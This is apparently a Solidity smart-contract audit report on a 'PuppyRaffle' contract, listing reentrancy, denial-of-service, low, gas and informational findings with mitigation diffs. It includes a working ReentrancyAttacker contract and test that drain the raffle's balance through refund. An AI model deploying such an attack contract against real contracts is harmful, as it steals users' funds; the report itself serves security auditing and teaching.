### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback` or `recieve` function that calls the `PuppyRaffle::refund` function. They could continue the cycle till the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. User enters the raffle
2. Attacker sets up a contract with a `fallback` or `recieve` function that calls the `PuppyRaffle::refund` function
3. Attacker enters the raffle
4. Attacker calls the `PuppyRaffle::refund`  from their attack contract, draining the contract balance

**Proof of code**

<details>
<summary>Code</summary>

Place the following into `PuppyRaffleTest.t.sol`

```javascript
    function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        // attack
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker contract balance: ", startingAttackContractBalance);
        console.log("starting contract balance: ", startingContractBalance);

        console.log("ending attacker contract balance: ", address(attackerContract).balance);
        console.log("ending contract balance: ", address(puppyRaffle).balance);
    }

```
And ths contract as well

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance > 0) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}

```
</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. additionally, we should move the event emission up as well. 

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }

```

### [M-#] Looping through players array to check for duplicates in `PuppyRafle::enterRaffle` is a potential denial of service (DoS), incrementing gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for the players who enter right when the raffle starts will be drammatically lower than those who enter later.
Every additional address in the `players` array, is an additional checkthe loop will have to make.

```javascript
// @audit DoS Attack
@> for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start  of a raffle to be the one of the first entrants in the queue.

**Proof of Concept:**

if we have 2 sets of 100 players enter, the gas costs will be as such:
- 1st 100 players: ~6252128 gas
- 2nd 100 players: ~18068218 gas

This is more than 3x more expensive for the second 100 players.

<details>
<summary>PoC</summary>
place the following test into `PuppyRaffleTest.t.sol`.

```javascript

    function test_denialOfService() public {
        vm.txGasPrice(1);

        // Let's enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        // See how much gas it costs
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas costof the first 100: ", gasUsedFirst);

        // Now for the 2nd 100 players
        //uint256 playersNum = 100;
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }
        // See how much gas it costs
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("Gas costof the first 100: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```
</details>



**Recommended Mitigation:** There are afew reccommendations.
1. Consider allowing duplicates. Users can add a new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

Alternatively, you can use [Openzeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player a t index 0 to incorrectly think they have not entered the raffle

**Description:** I f a player is in the `PuppyRaffle::players` array at index 0, but according to the natspac, it will also return 0 if the player is not in the array

```javascript
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enters the raffle, they are the first enrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation
**Recommended Mitigation:** The easiest reccomendation would be to revert if the player is not in the arrayinstead of returning 0.

You could also reserve the 0th position for any competition, but a better solution might be to return an int256 where the function returns -1 if the player is not active.

# Gas

### [G-1] Unchanged state variables should be declared constant or immutable

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` shuld be `constant`
- `PuppyRaffle::rareImageUri` shuld be `constant`
- `PuppyRaffle::legendaryImageUri` shuld be `constant`

### [G-2] Storage variables in a loop should be cached

Everytime you call `players.length` you read fro storage as opposed from memory which is more gas efficient

```diff
+   uint256 playersLength = players.length;
-    for (uint256 i = 0; i < players.length - 1; i++) {
+    for (uint256 i = 0; i < playersLength - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
+            for (uint256 j = i + 1; j < playersLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```
### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

</details>

### [I-2] Using an outdated version of solidity is not recommended.

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**:
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

### [I-4] `PuppyRaffle::selectWinner` should follow CEI

It's best to keep code clean and follow CEI (Checks, Effects, Interactions).

```diff
-    (bool success,) = winner.call{value: prizePool}("");
-    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);
+    (bool success,) = winner.call{value: prizePool}("");
+    require(success, "PuppyRaffle: Failed to send prize pool to winner");
```
